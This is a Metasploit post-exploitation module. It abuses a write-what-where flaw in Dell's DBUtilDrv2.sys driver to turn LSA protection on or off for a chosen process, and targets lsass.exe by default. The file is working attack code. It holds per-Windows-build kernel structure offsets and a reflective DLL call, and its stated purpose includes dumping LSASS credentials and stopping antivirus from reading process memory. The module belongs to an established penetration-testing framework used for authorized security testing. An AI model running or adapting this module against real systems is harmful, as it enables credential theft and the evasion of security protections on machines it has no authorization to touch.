##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  Rank = ManualRanking

  include Msf::Exploit::Local::WindowsKernel
  include Msf::Post::File
  include Msf::Post::Process
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Dell DBUtilDrv2.sys Memory Protection Modifier',
        'Description' => %q{
          The Dell DBUtilDrv2.sys drivers version 2.5 and 2.7 have a write-what-where condition
          that allows an attacker to read and write arbitrary kernel-mode memory. This module
          installs the provided driver, enables or disables LSA protection on the provided
          PID, and then removes the driver. This would allow, for example, dumping LSASS memory
          even when secureboot is enabled or preventing antivirus from accessing the memory of
          a chosen PID.

          The affected drivers are not distributed with Metasploit. You will truly need to
          Bring Your Own (Dell) Driver.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'SentinelLabs', # Vulnerability discovery in original Dell driver (dbutil_2_3.sys)
          'Kasif Dekel',  # (from SentinelLabs) blog with detailed analysis
          'Red Cursor',   # Authors of PPLKiller
          'Jacob Baines'  # first reference of incomplete patch, poc, & metasploit module
        ],
        'Platform' => 'win',
        'SessionTypes' => [ 'meterpreter' ],
        'References' => [
          [ 'URL', 'https://www.rapid7.com/blog/post/2021/12/13/driver-based-attacks-past-and-present/'],
          [ 'URL', 'https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection'],
          [ 'URL', 'https://itm4n.github.io/lsass-runasppl/'],
          [ 'URL', 'https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/' ],
          [ 'URL', 'https://attackerkb.com/assessments/12d7b263-3684-4442-812e-dc30b93def93'],
          [ 'URL', 'https://github.com/RedCursorSecurityConsulting/PPLKiller'],
          [ 'URL', 'https://github.com/jbaines-r7/dellicious' ]
        ],
        'Notes' => {
          'Reliability' => [ ],
          'Stability' => [ CRASH_OS_RESTARTS ],
          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ]
        }
      )
    )
    register_options([
      OptString.new('DRIVER_PATH', [true, 'The path containing the driver inf, cat, and sys (and coinstaller)', '']),
      OptInt.new('PID', [true, 'The targetted process. If set to 0 the module will automatically target lsass.exe', '0']),
      OptBool.new('ENABLE_MEM_PROTECT', [true, 'Enable or disable memory protection', 'false'])
    ])
  end

  def get_eproc_offsets
    sysinfo_value = sysinfo['OS']
    unless sysinfo_value =~ /Windows/
      print_status("Target is not Windows. Found #{sysinfo_value}")
      return nil
    end

    build_num = sysinfo_value.match(/Build (\d+)/)[1].to_i
    vprint_status("Windows Build Number = #{build_num}")

    # UniqueProcessIdOffset, ActiveProcessLinksOffset, SignatureLevelOffset
    offsets = {
      10240 => [ 0x02e8, 0x02f0, 0x06a8 ], # Gold
      10586 => [ 0x02e8, 0x02f0, 0x06b0 ], # 2015 update
      14393 => [ 0x02e8, 0x02f0, 0x06c8 ], # 2016 update
      15063 => [ 0x02e0, 0x02e8, 0x06c8 ], # April 2017 update
      16299 => [ 0x02e0, 0x02e8, 0x06c8 ], # Fall 2017 update
      17134 => [ 0x02e0, 0x02e8, 0x06c8 ], # April 2018 update
      17763 => [ 0x02e0, 0x02e8, 0x06c8 ], # October 2018 update
      18362 => [ 0x02e8, 0x02f0, 0x06f8 ], # May 2019 update
      18363 => [ 0x02e8, 0x02f0, 0x06f8 ], # November 2019 update
      19041 => [ 0x0440, 0x0448, 0x0878 ], # May 2020 update
      19042 => [ 0x0440, 0x0448, 0x0878 ], # October 2020 update
      19043 => [ 0x0440, 0x0448, 0x0878 ], # May 2021 update
      19044 => [ 0x0440, 0x0448, 0x0878 ], # October 2021 update
      22000 => [ 0x0440, 0x0448, 0x0878 ]  # Win 11 June/September 2021
    }

    unless offsets.key?(build_num)
      print_status("Unknown offsets for Windows build #{build_num}")
      return nil
    end

    return offsets[build_num]
  end

  def run
    unless is_system?
      fail_with(Failure::None, 'Elevated session is required')
    end

    offsets = get_eproc_offsets
    if offsets.nil?
      fail_with(Failure::NoTarget, 'Unsupported targeted')
    end

    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
    end

    unless datastore['DRIVER_PATH'].include? '\\'
      fail_with(Failure::BadConfig, "The driver path must be a file path. User provided: #{datastore['DRIVER_PATH']}")
    end

    # If the user doesn't select a PID select lsass.exe for them
    target_pid = datastore['PID']
    if target_pid == 0
      target_pid = pidof('lsass.exe').first
      print_status("Set PID option #{target_pid} for lsass.exe")
    end

    params = datastore['DRIVER_PATH']
    params += ','
    params += target_pid.to_s
    params += ','
    params += (datastore['ENABLE_MEM_PROTECT'] ? '1' : '0')
    params += ','
    params += offsets[0].to_s # UniqueProcessIdOffset
    params += ','
    params += offsets[1].to_s # ActiveProcessLinksOffset
    params += ','
    params += offsets[2].to_s # SignatureLevelOffset

    execute_dll(::File.join(Msf::Config.data_directory, 'exploits', 'dell_protect', 'dell_protect.x64.dll'), params)

    print_good('Exploit finished')
  end
end
